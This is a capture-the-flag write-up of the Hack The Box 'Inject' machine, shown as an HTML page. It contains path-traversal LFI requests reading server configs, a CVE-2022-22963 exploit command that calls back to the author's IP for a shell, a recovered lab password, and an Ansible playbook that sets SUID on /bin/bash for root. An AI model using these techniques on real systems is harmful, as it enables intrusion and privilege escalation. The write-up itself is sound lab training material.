@@ -1,0 +1,690 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2023-07-14 Fri 07:50 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HTB Inject</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" href="/static/org.css" />
+</head>
+<body>
+<div id="preamble" class="status">
+<nav class="navbar">
+  <div class="navbar-mode-line">
+    <a href="/" class="navbar-circle">◉</a>
+    <a href="/programming" class="navbar-filename">Programming</a>
+    <a href="/hacking" class="navbar-filename">Hacking</a>
+    <a href="/Tutorial" class="navbar-filename">Tutorials</a>
+    <a href="/posts.html" class="navbar-filename">All Posts</a>
+    <a href="/rss.xml" class="navbar-filename">Rss Feed</a>
+  </div>
+</nav>
+</div>
+<div id="content" class="content">
+<h1 class="title">HTB Inject</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org3656ce8">Inject</a>
+<ul>
+<li><a href="#orgd719e25">Nmap</a></li>
+<li><a href="#org06f128c">Inspecting the website</a></li>
+<li><a href="#orgc8f0ac0">LFI on the website</a></li>
+<li><a href="#org2da3192">Foothold.</a></li>
+<li><a href="#orgf379699">privesc</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org3656ce8" class="outline-2">
+<h2 id="org3656ce8">Inject</h2>
+<div class="outline-text-2" id="text-org3656ce8">
+<ul class="org-ul">
+<li>Diffculty: easy</li>
+<li>IP: 10.10.11.204</li>
+</ul>
+
+<p>
+Overall easy box make sure to do enumerate the webapp well.
+</p>
+</div>
+<div id="outline-container-orgd719e25" class="outline-3">
+<h3 id="orgd719e25">Nmap</h3>
+<div class="outline-text-3" id="text-orgd719e25">
+<p>
+As always start any machine off with nmap
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">nmap -oA scans/10.10.11.204 -A 10.10.11.204
+</pre>
+</div>
+<pre class="example" id="org66c49a3">
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 14:30 EDT
+Nmap scan report for 10.10.11.204
+Host is up (0.040s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
+|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
+|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
+8080/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Home
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=5/5%OT=22%CT=1%CU=30765%PV=Y%DS=2%DC=T%G=Y%TM=64554B5B
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
+OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
+OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1723/tcp)
+HOP RTT      ADDRESS
+1   43.52 ms 10.10.14.1
+2   36.60 ms 10.10.11.204
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.17 seconds
+</pre>
+
+<p>
+Port open:
+</p>
+
+<ul class="org-ul">
+<li>8080 http</li>
+<li>22 ssh</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org06f128c" class="outline-3">
+<h3 id="org06f128c">Inspecting the website</h3>
+<div class="outline-text-3" id="text-org06f128c">
+<p>
+Going to <a href="http://10.10.11.204:8080">http://10.10.11.204:8080</a> we can there is a webapp
+</p>
+
+
+
+<div id="org00739e0" class="figure">
+<p><img src="Inject/2023-05-05_14-47-20_screenshot.png" alt="2023-05-05_14-47-20_screenshot.png" />
+</p>
+</div>
+<p>
+Going to the signup and login pages are not currently working
+</p>
+
+
+<div id="orgfcd6b40" class="figure">
+<p><img src="Inject/2023-05-05_14-48-39_screenshot.png" alt="2023-05-05_14-48-39_screenshot.png" />
+</p>
+</div>
+
+
+<p>
+going to <code>/upload</code> works.
+it is a file upload page, lets upload an image and see what happens
+</p>
+
+
+<div id="org0e52054" class="figure">
+<p><img src="Inject/2023-05-05_14-51-13_screenshot.png" alt="2023-05-05_14-51-13_screenshot.png" />
+</p>
+</div>
+
+
+<p>
+When you upload a image you are given back a link to view your image. it keeps the same filename as the one you uploaded.
+url: <code>http://10.10.11.204:8080/show_image?img=default.png</code>
+</p>
+
+<p>
+My gut was right, that was a LFI on the img varible.
+</p>
+
+
+<div id="orgf1aa23a" class="figure">
+<p><img src="Inject/2023-05-05_14-55-52_screenshot.png" alt="2023-05-05_14-55-52_screenshot.png" />
+</p>
+</div>
+</div>
+</div>
+
+
+
+<div id="outline-container-orgc8f0ac0" class="outline-3">
+<h3 id="orgc8f0ac0">LFI on the website</h3>
+<div class="outline-text-3" id="text-orgc8f0ac0">
+<p>
+now with the lfi lets try and abuse it to find configuration files.
+</p>
+
+<p>
+Check if the server is nginx
+</p>
+<pre class="example" id="orgc64399a">
+GET http://10.10.11.204:8080/show_image?img=../../../../../../etc/nginx/nginx.conf HTTP/1.1
+Host: 10.10.11.204:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Content-Length: 0
+
+</pre>
+
+<p>
+Confirmed!
+</p>
+
+<pre class="example" id="org3b2ae62">
+user www-data;
+worker_processes auto;
+pid /run/nginx.pid;
+include /etc/nginx/modules-enabled/*.conf;
+
+events {
+	worker_connections 768;
+	# multi_accept on;
+}
+
+http {
+
+	##
+	# Basic Settings
+	##
+
+	sendfile on;
+	tcp_nopush on;
+	tcp_nodelay on;
+	keepalive_timeout 65;
+	types_hash_max_size 2048;
+	# server_tokens off;
+
+	# server_names_hash_bucket_size 64;
+	# server_name_in_redirect off;
+
+	include /etc/nginx/mime.types;
+	default_type application/octet-stream;
+
+	##
+	# SSL Settings
+	##
+
+	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
+	ssl_prefer_server_ciphers on;
+
+	##
+	# Logging Settings
+	##
+
+	access_log /var/log/nginx/access.log;
+	error_log /var/log/nginx/error.log;
+
+	##
+	# Gzip Settings
+	##
+
+	gzip on;
+
+	# gzip_vary on;
+	# gzip_proxied any;
+	# gzip_comp_level 6;
+	# gzip_buffers 16 8k;
+	# gzip_http_version 1.1;
+	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
+
+	##
+	# Virtual Host Configs
+	##
+
+	include /etc/nginx/conf.d/*.conf;
+	include /etc/nginx/sites-enabled/*;
+}
+
+
+#mail {
+#	# See sample authentication script at:
+#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
+#
+#	# auth_http localhost/auth.php;
+#	# pop3_capabilities "TOP" "USER";
+#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
+#
+#	server {
+#		listen     localhost:110;
+#		protocol   pop3;
+#		proxy      on;
+#	}
+#
+#	server {
+#		listen     localhost:143;
+#		protocol   imap;
+#		proxy      on;
+#	}
+#}
+</pre>
+
+<p>
+Lets get the default config.
+</p>
+
+<pre class="example" id="org076f35c">
+GET http://10.10.11.204:8080/show_image?img=../../../../../../etc/nginx/sites-enabled/default HTTP/1.1
+Host: 10.10.11.204:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Content-Length: 0
+</pre>
+
+<pre class="example" id="org7dcaecd">
+##
+# You should look at the following URL's in order to grasp a solid understanding
+# of Nginx configuration files in order to fully unleash the power of Nginx.
+# https://www.nginx.com/resources/wiki/start/
+# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
+# https://wiki.debian.org/Nginx/DirectoryStructure
+#
+# In most cases, administrators will remove this file from sites-enabled/ and
+# leave it as reference inside of sites-available where it will continue to be
+# updated by the nginx packaging team.
+#
+# This file will automatically load configuration files provided by other
+# applications, such as Drupal or Wordpress. These applications will be made
+# available underneath a path with that package name, such as /drupal8.
+#
+# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
+##
+
+# Default server configuration
+#
+server {
+	listen 80 default_server;
+	listen [::]:80 default_server;
+
+	# SSL configuration
+	#
+	# listen 443 ssl default_server;
+	# listen [::]:443 ssl default_server;
+	#
+	# Note: You should disable gzip for SSL traffic.
+	# See: https://bugs.debian.org/773332
+	#
+	# Read up on ssl_ciphers to ensure a secure configuration.
+	# See: https://bugs.debian.org/765782
+	#
+	# Self signed certs generated by the ssl-cert package
+	# Don't use them in a production server!
+	#
+	# include snippets/snakeoil.conf;
+
+	root /var/www/html;
+
+	# Add index.php to the list if you are using PHP
+	index index.html index.htm index.nginx-debian.html;
+
+	server_name _;
+
+	location / {
+		# First attempt to serve request as file, then
+		# as directory, then fall back to displaying a 404.
+		try_files $uri $uri/ =404;
+	}
+
+	# pass PHP scripts to FastCGI server
+	#
+	#location ~ \.php$ {
+	#	include snippets/fastcgi-php.conf;
+	#
+	#	# With php-fpm (or other unix sockets):
+	#	fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
+	#	# With php-cgi (or other tcp sockets):
+	#	fastcgi_pass 127.0.0.1:9000;
+	#}
+
+	# deny access to .htaccess files, if Apache's document root
+	# concurs with nginx's one
+	#
+	#location ~ /\.ht {
+	#	deny all;
+	#}
+}
+
+
+# Virtual Host configuration for example.com
+#
+# You can move that to a different file under sites-available/ and symlink that
+# to sites-enabled/ to enable it.
+#
+#server {
+#	listen 80;
+#	listen [::]:80;
+#
+#	server_name example.com;
+#
+#	root /var/www/example.com;
+#	index index.html;
+#
+#	location / {
+#		try_files $uri $uri/ =404;
+#	}
+#}
+
+</pre>
+
+
+<p>
+webroot is at <code>/var/www/html</code> which is the default location.
+</p>
+
+<p>
+So lets look at the LFI more to get to the webroot.
+</p>
+
+<p>
+<code>../../../../../../etc/nginx/sites-enabled/default</code>
+</p>
+
+<p>
+Lets insert what we know
+</p>
+
+<p>
+<code>/var/www/html/../../../</code>
+So from the upload dir we are <code>3 levels deep.
+so when fuzzing we need to give it ~../../../</code>
+Lets fuzz for webapp default files there
+</p>
+
+<p>
+I asked chat-gpt to make a list of default files a webapp would contain
+</p>
+<pre class="example" id="org1bdd711">
+index.php
+config.php
+functions.php
+header.php
+footer.php
+style.css
+script.js
+.htaccess
+index.jsp
+web.xml
+servlet.java
+pom.xml
+applicationContext.xml
+dispatcher-servlet.xml
+log4j.properties
+manage.py
+settings.py
+urls.py
+views.py
+models.py
+forms.py
+admin.py
+requirements.txt
+Gemfile
+config.ru
+application.rb
+routes.rb
+controllers/application_controller.rb
+models/application_record.rb
+views/layouts/application.html.erb
+db/schema.rb
+app.js
+package.json
+routes/index.js
+views/layout.ejs
+public/style.css
+public/script.js
+.env
+</pre>
+
+<p>
+Fuzzing i only found one file, that was <code>pom.xml</code> indicating it was a spring app.
+</p>
+
+<pre class="example" id="org37c0df9">
+GET http://10.10.11.204:8080/show_image?img=../../../pom.xml HTTP/1.1
+Host: 10.10.11.204:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Content-Length: 0
+</pre>
+<div class="org-src-container">
+<pre class="src src-xml">&lt;?<span style="font-weight: bold;">xml</span> <span style="font-style: italic;">version="1.0" encoding="UTF-8"</span>?&gt;
+&lt;<span style="font-weight: bold;">project</span> <span style="font-weight: bold;">xmlns</span>=<span style="font-style: italic;">"http://maven.apache.org/POM/4.0.0"</span> <span style="font-weight: bold;">xmlns</span>:<span style="font-weight: bold; font-style: italic;">xsi</span>=<span style="font-style: italic;">"http://www.w3.org/2001/XMLSchema-instance"</span>
+        <span style="font-weight: bold;">xsi</span>:<span style="font-weight: bold; font-style: italic;">schemaLocation</span>=<span style="font-style: italic;">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;
+        &lt;<span style="font-weight: bold;">modelVersion</span>&gt;4.0.0&lt;/<span style="font-weight: bold;">modelVersion</span>&gt;
+        &lt;<span style="font-weight: bold;">parent</span>&gt;
+                &lt;<span style="font-weight: bold;">groupId</span>&gt;org.springframework.boot&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+                &lt;<span style="font-weight: bold;">artifactId</span>&gt;spring-boot-starter-parent&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+                &lt;<span style="font-weight: bold;">version</span>&gt;2.6.5&lt;/<span style="font-weight: bold;">version</span>&gt;
+                &lt;<span style="font-weight: bold;">relativePath</span>/&gt; <span style="font-weight: bold; font-style: italic;">&lt;!-- </span><span style="font-weight: bold; font-style: italic;">lookup parent from repository</span><span style="font-weight: bold; font-style: italic;"> --&gt;</span>
+        &lt;/<span style="font-weight: bold;">parent</span>&gt;
+        &lt;<span style="font-weight: bold;">groupId</span>&gt;com.example&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+        &lt;<span style="font-weight: bold;">artifactId</span>&gt;WebApp&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+        &lt;<span style="font-weight: bold;">version</span>&gt;0.0.1-SNAPSHOT&lt;/<span style="font-weight: bold;">version</span>&gt;
+        &lt;<span style="font-weight: bold;">name</span>&gt;WebApp&lt;/<span style="font-weight: bold;">name</span>&gt;
+        &lt;<span style="font-weight: bold;">description</span>&gt;Demo project for Spring Boot&lt;/<span style="font-weight: bold;">description</span>&gt;
+        &lt;<span style="font-weight: bold;">properties</span>&gt;
+                &lt;<span style="font-weight: bold;">java.version</span>&gt;11&lt;/<span style="font-weight: bold;">java.version</span>&gt;
+        &lt;/<span style="font-weight: bold;">properties</span>&gt;
+        &lt;<span style="font-weight: bold;">dependencies</span>&gt;
+                &lt;<span style="font-weight: bold;">dependency</span>&gt;
+                        &lt;<span style="font-weight: bold;">groupId</span>&gt;com.sun.activation&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+                        &lt;<span style="font-weight: bold;">artifactId</span>&gt;javax.activation&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+                        &lt;<span style="font-weight: bold;">version</span>&gt;1.2.0&lt;/<span style="font-weight: bold;">version</span>&gt;
+                &lt;/<span style="font-weight: bold;">dependency</span>&gt;
+
+                &lt;<span style="font-weight: bold;">dependency</span>&gt;
+                        &lt;<span style="font-weight: bold;">groupId</span>&gt;org.springframework.boot&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+                        &lt;<span style="font-weight: bold;">artifactId</span>&gt;spring-boot-starter-thymeleaf&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+                &lt;/<span style="font-weight: bold;">dependency</span>&gt;
+                &lt;<span style="font-weight: bold;">dependency</span>&gt;
+                        &lt;<span style="font-weight: bold;">groupId</span>&gt;org.springframework.boot&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+                        &lt;<span style="font-weight: bold;">artifactId</span>&gt;spring-boot-starter-web&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+                &lt;/<span style="font-weight: bold;">dependency</span>&gt;
+
+                &lt;<span style="font-weight: bold;">dependency</span>&gt;
+                        &lt;<span style="font-weight: bold;">groupId</span>&gt;org.springframework.boot&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+                        &lt;<span style="font-weight: bold;">artifactId</span>&gt;spring-boot-devtools&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+                        &lt;<span style="font-weight: bold;">scope</span>&gt;runtime&lt;/<span style="font-weight: bold;">scope</span>&gt;
+                        &lt;<span style="font-weight: bold;">optional</span>&gt;true&lt;/<span style="font-weight: bold;">optional</span>&gt;
+                &lt;/<span style="font-weight: bold;">dependency</span>&gt;
+
+                &lt;<span style="font-weight: bold;">dependency</span>&gt;
+                        &lt;<span style="font-weight: bold;">groupId</span>&gt;org.springframework.cloud&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+                        &lt;<span style="font-weight: bold;">artifactId</span>&gt;spring-cloud-function-web&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+                        &lt;<span style="font-weight: bold;">version</span>&gt;3.2.2&lt;/<span style="font-weight: bold;">version</span>&gt;
+                &lt;/<span style="font-weight: bold;">dependency</span>&gt;
+                &lt;<span style="font-weight: bold;">dependency</span>&gt;
+                        &lt;<span style="font-weight: bold;">groupId</span>&gt;org.springframework.boot&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+                        &lt;<span style="font-weight: bold;">artifactId</span>&gt;spring-boot-starter-test&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+                        &lt;<span style="font-weight: bold;">scope</span>&gt;test&lt;/<span style="font-weight: bold;">scope</span>&gt;
+                &lt;/<span style="font-weight: bold;">dependency</span>&gt;
+                &lt;<span style="font-weight: bold;">dependency</span>&gt;
+                        &lt;<span style="font-weight: bold;">groupId</span>&gt;org.webjars&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+                        &lt;<span style="font-weight: bold;">artifactId</span>&gt;bootstrap&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+                        &lt;<span style="font-weight: bold;">version</span>&gt;5.1.3&lt;/<span style="font-weight: bold;">version</span>&gt;
+                &lt;/<span style="font-weight: bold;">dependency</span>&gt;
+                &lt;<span style="font-weight: bold;">dependency</span>&gt;
+                        &lt;<span style="font-weight: bold;">groupId</span>&gt;org.webjars&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+                        &lt;<span style="font-weight: bold;">artifactId</span>&gt;webjars-locator-core&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+                &lt;/<span style="font-weight: bold;">dependency</span>&gt;
+
+        &lt;/<span style="font-weight: bold;">dependencies</span>&gt;
+        &lt;<span style="font-weight: bold;">build</span>&gt;
+                &lt;<span style="font-weight: bold;">plugins</span>&gt;
+                        &lt;<span style="font-weight: bold;">plugin</span>&gt;
+                                &lt;<span style="font-weight: bold;">groupId</span>&gt;org.springframework.boot&lt;/<span style="font-weight: bold;">groupId</span>&gt;
+                                &lt;<span style="font-weight: bold;">artifactId</span>&gt;spring-boot-maven-plugin&lt;/<span style="font-weight: bold;">artifactId</span>&gt;
+                                &lt;<span style="font-weight: bold;">version</span>&gt;${parent.version}&lt;/<span style="font-weight: bold;">version</span>&gt;
+                        &lt;/<span style="font-weight: bold;">plugin</span>&gt;
+                &lt;/<span style="font-weight: bold;">plugins</span>&gt;
+                &lt;<span style="font-weight: bold;">finalName</span>&gt;spring-webapp&lt;/<span style="font-weight: bold;">finalName</span>&gt;
+        &lt;/<span style="font-weight: bold;">build</span>&gt;
+
+&lt;/<span style="font-weight: bold;">project</span>&gt;
+
+</pre>
+</div>
+
+
+<p>
+Even more lazy, asked gpt to tell me everything from the pom.xml it knows about
+</p>
+
+<pre class="example" id="org6554e41">
+Spring Boot parent version: 2.6.5
+Java version: 11
+javax.activation version: 1.2.0
+spring-boot-starter-thymeleaf: version not specified, which means it uses the default version defined in the Spring Boot parent.
+spring-boot-starter-web: version not specified, which means it uses the default version defined in the Spring Boot parent.
+spring-boot-devtools: version not specified, which means it uses the default version defined in the Spring Boot parent.
+spring-cloud-function-web: version 3.2.2
+spring-boot-starter-test: version not specified, which means it uses the default version defined in the Spring Boot parent.
+bootstrap: version 5.1.3
+webjars-locator-core: version not specified, which means it uses the latest version available in the repository.
+</pre>
+
+<p>
+Out of these searchinf for <code>spring-cloud-function-web: version 3.2.2</code> Shows that it is vulnerable to CVE-2022-22963.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
+</p>
+
+<p>
+Using the exploit, i modifed slightly to use pwncat-cs.
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">python exploit.py -i 10.10.14.147 -u http://10.10.11.204:8080
+</pre>
+</div>
+
+<p>
+You now have foothold
+</p>
+</div>
+</div>
+
+<div id="outline-container-org2da3192" class="outline-3">
+<h3 id="org2da3192">Foothold.</h3>
+<div class="outline-text-3" id="text-org2da3192">
+<p>
+you get back a shell as a user named <code>frank</code>.
+</p>
+
+<p>
+looking around you can find a file at <code>~/.m2/settings.xml</code> which contains creds for user, which you can not use with ssh sadly.
+</p>
+<div class="org-src-container">
+<pre class="src src-xml">&lt;?<span style="font-weight: bold;">xml</span> <span style="font-style: italic;">version="1.0" encoding="UTF-8"</span>?&gt;
+&lt;<span style="font-weight: bold;">settings</span> <span style="font-weight: bold;">xmlns</span>=<span style="font-style: italic;">"http://maven.apache.org/POM/4.0.0"</span> <span style="font-weight: bold;">xmlns</span>:<span style="font-weight: bold; font-style: italic;">xsi</span>=<span style="font-style: italic;">"http://www.w3.org/2001/XMLSchema-instance"</span>
+        <span style="font-weight: bold;">xsi</span>:<span style="font-weight: bold; font-style: italic;">schemaLocation</span>=<span style="font-style: italic;">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;
+  &lt;<span style="font-weight: bold;">servers</span>&gt;
+    &lt;<span style="font-weight: bold;">server</span>&gt;
+      &lt;<span style="font-weight: bold;">id</span>&gt;Inject&lt;/<span style="font-weight: bold;">id</span>&gt;
+      &lt;<span style="font-weight: bold;">username</span>&gt;phil&lt;/<span style="font-weight: bold;">username</span>&gt;
+      &lt;<span style="font-weight: bold;">password</span>&gt;DocPhillovestoInject123&lt;/<span style="font-weight: bold;">password</span>&gt;
+      &lt;<span style="font-weight: bold;">privateKey</span>&gt;${user.home}/.ssh/id_dsa&lt;/<span style="font-weight: bold;">privateKey</span>&gt;
+      &lt;<span style="font-weight: bold;">filePermissions</span>&gt;660&lt;/<span style="font-weight: bold;">filePermissions</span>&gt;
+      &lt;<span style="font-weight: bold;">directoryPermissions</span>&gt;660&lt;/<span style="font-weight: bold;">directoryPermissions</span>&gt;
+      &lt;<span style="font-weight: bold;">configuration</span>&gt;&lt;/<span style="font-weight: bold;">configuration</span>&gt;
+    &lt;/<span style="font-weight: bold;">server</span>&gt;
+  &lt;/<span style="font-weight: bold;">servers</span>&gt;
+&lt;/<span style="font-weight: bold;">settings</span>&gt;
+</pre>
+</div>
+<ul class="org-ul">
+<li>phil:DocPhillovestoInject123</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgf379699" class="outline-3">
+<h3 id="orgf379699">privesc</h3>
+<div class="outline-text-3" id="text-orgf379699">
+<p>
+running linpeas shows alot of ansible related items and that <code>/opt/automation/</code> is writble to memebers of the automation group, which phil is.
+running <code>pspy64</code> i see that root runs ansible on all playbooks in the automation directory.<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
+</p>
+<pre class="example" id="orgc8e2aa7">
+2023/06/27 13:20:01 CMD: UID=0     PID=2559   | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
+</pre>
+<p>
+I choose to write a playbook that sets suid on /bin/bash
+</p>
+
+<div class="org-src-container">
+<pre class="src src-yaml">- hosts: localhost
+
+  tasks:
+    - name: Set setuid permission
+      file:
+	path: /bin/bash
+	mode: "u+s"
+</pre>
+</div>
+<p>
+then after a few moments you can run <code>bash -p</code> to become root.
+</p>
+</div>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+Exploit i used
+</p></div></div>
+
+<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a>
+</p></div></div>
+
+
+</div>
+</div></div>
+<div id="postamble" class="status">
+<p class="author">Author:  (<a href="mailto:unseen@flake">unseen@flake</a>)</p>
+<p class="date">Date: </p>
+<p class="creator"><a href="https://www.gnu.org/software/emacs/">Emacs</a> 28.2 (<a href="https://orgmode.org">Org</a> mode 9.5.5)</p>
+<p class="validation"></p>
+</div>
+</body>
+</html>
